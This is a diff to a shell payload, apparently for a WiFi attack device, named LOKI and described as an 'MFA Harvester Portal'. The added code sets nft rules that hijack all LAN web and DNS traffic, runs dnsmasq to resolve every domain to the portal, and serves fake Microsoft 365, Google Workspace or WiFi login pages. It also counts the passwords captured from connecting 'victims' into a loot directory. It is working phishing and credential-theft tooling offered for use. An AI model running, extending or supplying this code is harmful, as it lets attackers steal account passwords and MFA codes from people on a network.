@@ -580,14 +580,36 @@ activate_portal() {
     # Test and restart nginx
     if nginx -t 2>/dev/null; then
         /etc/init.d/nginx restart
-        LOG "Portal $portal_name activated"
     else
         LOG "ERROR: nginx config test failed"
+        return 1
     fi
+
+    # Create loot directory with proper permissions
+    mkdir -p /root/loot/loki
+    chmod 777 /root/loot/loki
+
+    # Set up redirect rules (nft) - bypass broken init script
+    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 80 counter dnat ip to 172.16.52.1:80 2>/dev/null
+    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 443 counter dnat ip to 172.16.52.1:80 2>/dev/null
+    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 udp dport 53 counter dnat ip to 172.16.52.1:5353 2>/dev/null
+    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 53 counter dnat ip to 172.16.52.1:5353 2>/dev/null
+
+    # Start DNS spoofing
+    pkill -f "dnsmasq.*5353" 2>/dev/null
+    dnsmasq --no-hosts --no-resolv --address=/#/172.16.52.1 -p 5353 &
+
+    LOG "Portal $portal_name activated"
 }
 
 deactivate_portal() {
     LOG "Deactivating LOKI portal..."
+
+    # Stop DNS spoofing
+    pkill -f "dnsmasq.*5353" 2>/dev/null
+
+    # Remove redirect rules (flush and recreate empty chain)
+    nft flush chain inet fw4 dstnat 2>/dev/null
 
     # Clear all symlinks from /www
     rm -rf /www/*
@@ -612,6 +634,34 @@ check_portal_active() {
     return 1
 }
 
+get_active_portal_name() {
+    # Return the name of the currently active portal
+    if [ -L "/www/index.php" ]; then
+        local target=$(readlink -f /www/index.php 2>/dev/null)
+        if echo "$target" | grep -q "loki_microsoft"; then
+            echo "Microsoft 365"
+        elif echo "$target" | grep -q "loki_google"; then
+            echo "Google Workspace"
+        elif echo "$target" | grep -q "loki_wifi"; then
+            echo "WiFi Captive"
+        else
+            echo "Unknown"
+        fi
+    else
+        echo "None"
+    fi
+}
+
+get_cred_count() {
+    # Count total credentials captured
+    local count=0
+    local files=$(ls "$LOOT_DIR"/*.txt 2>/dev/null)
+    if [ -n "$files" ]; then
+        count=$(grep -c "COMPLETE CAPTURE\|Password:" "$LOOT_DIR"/*.txt 2>/dev/null || echo 0)
+    fi
+    echo "$count"
+}
+
 # === MAIN EXECUTION ===
 
 LOG ""
@@ -621,26 +671,22 @@ LOG "| |_| (_) | ' < | | "
 LOG "|____\\___/|_|\\_\\___|"
 LOG ""
 LOG " MFA Harvester Portal v1.0"
-LOG " The Trickster God"
 LOG ""
 
-# Check Evil Portal
+# Check Evil Portal infrastructure
 if ! check_evil_portal; then
     if check_evil_portal_payload; then
-        ERROR_DIALOG "Evil Portal not installed yet!
+        ERROR_DIALOG "Evil Portal not installed!
 
-The Evil Portal PAYLOAD exists but hasn't been run.
-
-Go to:
+Run the Evil Portal payload first:
 Payloads > evil_portal > install_evil_portal
 
 Then run LOKI again."
     else
         ERROR_DIALOG "Evil Portal not found!
 
-LOKI requires Evil Portal to be installed.
-
-Please install the Evil Portal payload first."
+LOKI requires Evil Portal.
+Install the Evil Portal payload first."
     fi
     exit 1
 fi
@@ -652,67 +698,59 @@ detect_portal_ip
 led_setup
 mkdir -p "$LOOT_DIR"
 
-# Check if portal is already active
-portal_status="No portal active"
+# === SMART CONTEXT-AWARE MENU ===
+
 if check_portal_active; then
-    portal_status="LOKI portal ACTIVE"
-fi
+    # === PORTAL IS ACTIVE - SHOW ACTIVE MENU ===
+    active_portal=$(get_active_portal_name)
+    cred_count=$(get_cred_count)
 
-PROMPT "LOKI - MFA Harvester Portal
+    LOG "Portal ACTIVE: $active_portal"
+    LOG "Credentials: $cred_count"
+    LOG ""
 
-Status: $portal_status
-Portal IP: $PORTAL_IP
+    # Show active portal menu
+    mode_choice=$(CONFIRMATION_DIALOG "LOKI Active: $active_portal
 
-Press OK to continue."
+Credentials captured: $cred_count
 
-# Mode selection
-LOG ""
-LOG "Select Mode:"
-LOG "1. Activate Portal"
-LOG "2. Deactivate Portal"
-LOG ""
+YES = Deactivate Portal
+NO = Switch Portal")
 
-mode_choice=$(NUMBER_PICKER "Select Mode (1-2)" 1)
-case $? in
-    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
-        LOG "Cancelled"
-        exit 1
-        ;;
-esac
+    case $? in
+        $DUCKYSCRIPT_CANCELLED)
+            LOG "Cancelled"
+            exit 0
+            ;;
+    esac
 
-[ -z "$mode_choice" ] && mode_choice=1
+    if [ "$mode_choice" = "1" ]; then
+        # Deactivate
+        deactivate_portal
+        led_success
+        VIBRATE 100
 
-# Handle deactivate mode
-if [ "$mode_choice" -eq "$MODE_DEACTIVATE" ]; then
-    if ! check_portal_active; then
-        ALERT "No LOKI portal is currently active."
+        ALERT "LOKI Deactivated
+
+Portal stopped.
+Redirect rules removed.
+
+Credentials saved in:
+$LOOT_DIR"
         exit 0
     fi
 
-    DIALOG_RESULT=$(CONFIRMATION_DIALOG "Deactivate LOKI portal?")
-    if [ "$DIALOG_RESULT" != "1" ]; then
-        LOG "Cancelled"
-        exit 0
-    fi
-
-    deactivate_portal
-    led_success
-    VIBRATE 100
-
-    ALERT "LOKI Portal Deactivated
-
-Portal has been stopped.
-/www/ restored to default."
-
-    exit 0
+    # User chose NO = Switch Portal, fall through to portal selection
+    LOG "Switching portal..."
 fi
 
-# Continue with activate mode
+# === PORTAL NOT ACTIVE OR SWITCHING - SHOW PORTAL SELECTION ===
+
 LOG ""
-LOG "Select Portal Template:"
-LOG "1. Microsoft 365 (MFA)"
-LOG "2. Google Workspace (MFA)"
-LOG "3. WiFi Captive Portal"
+LOG "Select Portal:"
+LOG "1. Microsoft 365"
+LOG "2. Google Workspace"
+LOG "3. WiFi Captive"
 LOG ""
 
 portal_choice=$(NUMBER_PICKER "Select Portal (1-3)" 1)
@@ -729,16 +767,9 @@ esac
 
 portal_name="${PORTAL_NAMES[$portal_choice]}"
 
-# Confirmation
-DIALOG_RESULT=$(CONFIRMATION_DIALOG "Install $portal_name portal?")
-if [ "$DIALOG_RESULT" != "1" ]; then
-    LOG "Cancelled"
-    exit 0
-fi
+# Install and activate selected portal
+LOG "Activating $portal_name..."
 
-LOG "Installing $portal_name portal..."
-
-# Install selected portal
 case $portal_choice in
     1)
         install_microsoft_portal
@@ -760,19 +791,14 @@ LOG ""
 LOG "=== LOKI ACTIVE ==="
 LOG "Portal: $portal_name"
 LOG "URL: http://$PORTAL_IP/"
-LOG "Loot: $LOOT_DIR"
-LOG ""
-LOG "Credentials will be logged to:"
-LOG "$LOOT_DIR/"
 LOG ""
 
-ALERT "LOKI Portal Active!
+ALERT "LOKI Active!
 
-$portal_name
+$portal_name portal running.
 
-Victims connecting to your network will see this portal.
+Victims see this when connecting.
 
-Credentials saved to:
-$LOOT_DIR"
+Loot: $LOOT_DIR"
 
 exit 0
